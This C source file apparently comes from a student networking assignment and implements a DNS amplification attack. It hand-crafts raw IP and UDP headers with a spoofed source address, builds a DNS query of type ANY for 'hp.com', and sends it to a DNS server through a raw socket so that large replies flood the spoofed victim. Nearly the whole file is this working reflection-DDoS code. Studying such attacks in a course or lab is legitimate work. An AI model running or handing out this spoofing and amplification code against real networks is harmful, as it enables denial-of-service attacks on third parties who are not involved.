#include "dnsamp.h"

void PrintError(char *error){
	printf("%s\n", error);
	exit(-1);
}

void CreateDnsHeader(dh *dns){
	// QUERY_ID uses the last 16 bits of my student id, which is defined in dnsamp.h
	dns->query_id = (unsigned short) htons(QUERY_ID);
	dns->flags = htons(FLAG_Q);
	dns->qcount = htons(1);
	dns->anscount = 0;
	dns->authrr = 0;
	dns->addrr = 0;
}

void CreateQueryInfo(query *q){
	q->dnsq_type = htons(0x00ff);
	q->dnsq_class = htons(1);
}

void CreatePseudoHeader(ph *psheader, char* spoofip, char* dnsip){
	inet_pton(AF_INET, spoofip, &psheader->saddr);
	inet_pton(AF_INET, dnsip, &psheader->daddr);
	psheader->fill = 0;
	psheader->proto = IPPROTO_UDP;
}

// Calculate UDP checksum
unsigned short CheckIpUdpSum(int length, unsigned short *ptr){
	long sum = 0;
	unsigned short odd = 0;

	for(; length > 1; length -= 2){
		sum += *ptr++;
	}
	if(length == 1){
		*((unsigned char *)&odd) = *(unsigned char *)ptr;
		sum += odd;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);

	return (short)~sum;

}

void SendDnsPacket(char* dnsip, char* spoofip, int port){
	int sd;
	unsigned char dns_data[128];
	char buf[4096], *data, *psdata;
	unsigned char* dns_server;
	struct sockaddr_in sin, din;
	memset(buf, 0, 4096);

	dh *dnsheader = (dh *)&dns_data;
	CreateDnsHeader(dnsheader);

	dns_server = (unsigned char *)&dns_data[sizeof(dh)];
	// *dns_server++ = '\3';
	// *dns_server++ = 'w';
	// *dns_server++ = 'w';
	// *dns_server++ = 'w';
	// *dns_server++ = '\6';
	// *dns_server++ = 'g';
	// *dns_server++ = 'o';
	// *dns_server++ = 'o';
	// *dns_server++ = 'g';
	// *dns_server++ = 'l';
	// *dns_server++ = 'e';
	// *dns_server++ = '\3';
	// *dns_server++ = 'c';
	// *dns_server++ = 'o';
	// *dns_server++ = 'm';
	// *dns_server++ = '\0';
	*dns_server++ = '\2';
	*dns_server++ = 'h';
	*dns_server++ = 'p';
	*dns_server++ = '\3';
	*dns_server++ = 'c';
	*dns_server++ = 'o';
	*dns_server++ = 'm';
	*dns_server++ = '\0';
	int length = 12;
	query *Query = (query *)&dns_data[(sizeof(dnsheader) + length)];
	CreateQueryInfo(Query);

	data = buf + sizeof(ih) + sizeof(uh);
	memcpy(data, &dns_data, sizeof(dh) + length + sizeof(Query) + 1);

	sin.sin_family = AF_INET;
	din.sin_family = AF_INET;
	sin.sin_port = htons(53);
	din.sin_port = htons(port);
	sin.sin_addr.s_addr = inet_addr(dnsip);
	din.sin_addr.s_addr = inet_addr(spoofip);

	ih *ipheader = (ih *)buf;
	ipheader->ihl = 5;
	ipheader->version = 4;
	ipheader->tos = 0;
	ipheader->tot_len = sizeof(ih) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length;
	ipheader->id = htonl(QUERY_ID);
	ipheader->ttl = 64;
	ipheader->protocol = 17;
	ipheader->saddr = inet_addr(spoofip);
	ipheader->daddr = inet_addr(dnsip);
	ipheader->check = 0;
	ipheader->check = CheckIpUdpSum(sizeof(ih) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length, (unsigned short *)buf);

	uh *udpheader = (uh *)(buf + sizeof(ih));
	udpheader->source = htons(port);
	udpheader->dest = htons(53);
	udpheader->len = htons(8 + sizeof(dh) + sizeof(Query) + length);
	udpheader->check = 0;
	
	ph pseudoheader;
	CreatePseudoHeader(&pseudoheader, spoofip, dnsip);
	pseudoheader.len = htons(sizeof(uh) + sizeof(dh) + length + sizeof(Query));
	int size = sizeof(ph) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length;
	psdata = malloc(size);

	memcpy(psdata, (char*)&pseudoheader, sizeof(ph));
	memcpy(psdata + sizeof(ph), udpheader, sizeof(uh) + sizeof(dh) + sizeof(Query) + length);

	udpheader->check = CheckIpUdpSum(size, (unsigned short *)psdata);

	int one = 1;
	const int *val = &one;
	sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
	if(sd < 0){
		printf("sd = %d\n", sd);
		PrintError("socket error");
	}
	else{
		if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
		{
			printf("error\n");	
			exit(-1);
		}
		if(sendto(sd, buf, ipheader->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
			printf("packet send error %d which means %s\n",errno,strerror(errno));
	}
	close(sd);
	free(psdata);
	return;

}